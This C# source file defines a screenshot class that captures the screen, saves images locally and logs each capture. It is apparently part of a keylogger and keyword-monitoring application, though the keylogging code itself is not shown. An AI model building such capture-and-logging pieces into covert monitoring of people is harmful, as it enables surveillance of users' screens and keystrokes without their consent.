using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Drawing.Imaging;
using System.Collections.Generic;
using System.Reflection;
using WindowsFormsApp1;
using System.Threading.Tasks;
using System.IO;

namespace WpfApp15.ViewModel
{
    internal class ScreenShot
    {
        public bool CaptureCursor { get; set; } = false;
        public string SaveFolder { get; set; } = string.Empty;
        public string NamePattern { get; set; } = string.Empty;
        public string Number { get; set; } = string.Empty;
        public bool Overwrite { get; set; } = false;
        public  MainViewModel MainViewModel { get; set; }

        private ImageFormat _Format = ImageFormat.Jpeg;
        public ImageFormat Format
        {
            get { return _Format; }
            set
            {
                _Format = value;
                MIMEType = dictMIMEType[value];
            }
        }

        #region WinAPI
        [DllImport("user32.dll")]
        private static extern bool GetCursorInfo(out CursorInfo pci);
        private struct CursorInfo
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public Point ptScreenPos;
        }
        #endregion

        private string MIMEType = "image/png";
        private Dictionary<ImageFormat, string> dictMIMEType = new Dictionary<ImageFormat, string>()
        {
            {ImageFormat.Bmp, "image/bmp" },
            {ImageFormat.Gif, "image/gif" },
            {ImageFormat.Jpeg, "image/jpeg" },
            {ImageFormat.Png, "image/png" },
            {ImageFormat.Tiff, "image/tiff" },
        };

        public ScreenShot(bool cursor, string folder, string pattern, string number, ImageFormat format, bool overwrite, MainViewModel mainViewModel)
        {
            CaptureCursor = cursor;
            SaveFolder = folder;
            NamePattern = pattern;
            Number = number;
            Format = format;
            Overwrite = overwrite;
            this.MainViewModel = mainViewModel;
            MainViewModel.getInstance();
        }

        public ScreenShotInfo CaptureAndSave()
        {
            Image img = captureScreen(CaptureCursor);
            var fullname = saveImage(img);
            bool success = fullname[0] == '[' ? false : true;
            return new ScreenShotInfo(success, fullname, GetFileName(fullname), success ? fullname : "");
        }
        public static string GetFileName(string fullname)
        {
            // Input:   C:\Boss Ox\CapCap\Image.Jpg
            // Output:  Image.Jpg
            return fullname.Substring(fullname.LastIndexOf('\\') + 1);
        }
        private Image captureScreen(bool capture_cursor)
        {
            // Capture screen.
            Image img = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphic = Graphics.FromImage(img);
            graphic.CopyFromScreen(new Point(0, 0), new Point(0, 0), Screen.AllScreens[0].Bounds.Size);

            if (capture_cursor)
            {
                CursorInfo ci;
                ci.cbSize = Marshal.SizeOf(typeof(CursorInfo));
                GetCursorInfo(out ci);
                Cursor cursor = new Cursor(ci.hCursor);
                cursor.Draw(graphic, new Rectangle(ci.ptScreenPos.X, ci.ptScreenPos.Y, cursor.Size.Width, cursor.Size.Height));
                cursor.Dispose();
            }
            graphic.Dispose();
            return img;
        }
        static int i = 0;
        private string saveImage(Image img)
        {
            string filename = SaveFolder + $"\\Img{i}." + Format;
            i++;
            try
            {
                if (System.IO.File.Exists(filename) && !Overwrite)
                    return saveRenamedImage(img, filename, 2);
 
                var EPs = new EncoderParameters(1);
                var EP = new EncoderParameter(Encoder.Quality, 100L);
                EPs.Param[0] = EP;

                img.Save(filename, GetEncoderInfo(), EPs);
                MainViewModel.UpdateEventLog("Save screenDekstop: ", $"  {DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss")}");
                sendNotificationScreenDekstop(filename,true);
                try
                {
                    using (StreamWriter sw = new StreamWriter(LoggerKeys.loggerPath, true))
                    {
                        sw.WriteLine(Environment.NewLine);                     
                        sw.WriteLine($"<<<  Save screenDekstop to file: {filename}" + $"  {DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss")}  >>>");
                        
                    }                   
                }
                catch(Exception er)   {   }
                return filename;
            }
            catch (Exception exp)
            {
                sendNotificationScreenDekstop(filename, false);
                return $"[{exp.Message}]";
            }
            finally
            {
                img.Dispose();
            }
        }

        private async  void sendNotificationScreenDekstop(string filename, bool success)
        {
            using (Form1 form1 = new Form1())
            {
                await form1.StartMessage(30, Assembly.GetExecutingAssembly().GetName().Name, string.Format("{0}", string.Format("{0} {1} {2}", "Screenshot", filename,
                success ? "Status_Success" : "Status_Failed")), success ? ToolTipIcon.Info : ToolTipIcon.Error);
            }
        }
        public static void sendNotificationKeyLoggerDekstop(string filename)
        {
                using (Form1 form1 = new Form1())
                {
                    form1.StartMessage(30, Assembly.GetExecutingAssembly().GetName().Name, string.Format("{0}", string.Format("{0} {1}", "Start KeyLogger","To file: " +filename)), ToolTipIcon.Info);
                }
        }
        public static void sendNotificationKeyWord(string filename, string WORD)
        {
            using (Form1 form1 = new Form1())
            {
                form1.StartMessage(10, Assembly.GetExecutingAssembly().GetName().Name, string.Format("{0}", string.Format("{0} {1}", $"WORD {WORD} FOUNDED", "To file: " + filename)), ToolTipIcon.Info);
            }
        }
        public static void sendNotification(int delay, string title, string text, ToolTipIcon toolTipIcon)
        {
            using (Form1 form1 = new Form1())
            {
                form1.StartMessage(delay, title, text,toolTipIcon);
            }
        }


        //private string getFullname()
        //{
        //    var nPattern = new NamePattern(NamePattern, int.Parse(Number));
        //    return string.Format(@"{0}\{1}.{2}", SaveFolder, nPattern.Convert(), Format.ToString().ToUpper());
        //}

        private string saveRenamedImage(Image img, string fullname, int number)
        {
            try
            {
                string filename = fullname.Substring(0, fullname.Length - Format.ToString().Length - 1);
                filename += $" ({number.ToString()}).{Format.ToString().ToUpper()}";

                if (System.IO.File.Exists(filename))
                    return saveRenamedImage(img, fullname, number + 1);
                else
                    img.Save(filename, Format);

                return filename;
            }
            catch (Exception exp)
            {
                return $"[Exception:{exp.Message}]";
            }
            finally
            {
                img.Dispose();
            }
        }

        private ImageCodecInfo GetEncoderInfo()
        {
            // from MSDN
            ImageCodecInfo[] encoders = ImageCodecInfo.GetImageEncoders();
            foreach (var encoder in encoders)
            {
                if (encoder.MimeType == MIMEType)
                    return encoder;
            }
            return null;
        }
    }

    internal class ScreenShotInfo
    {
        public bool Success { get; }
        public string FullName { get; }
        public string FileName { get; }
        public string Message { get; }

        public ScreenShotInfo(bool success, string fullname, string filename, string message)
        {
            Success = success;
            FullName = fullname;
            FileName = filename;
            Message = message;
        }
    }
}
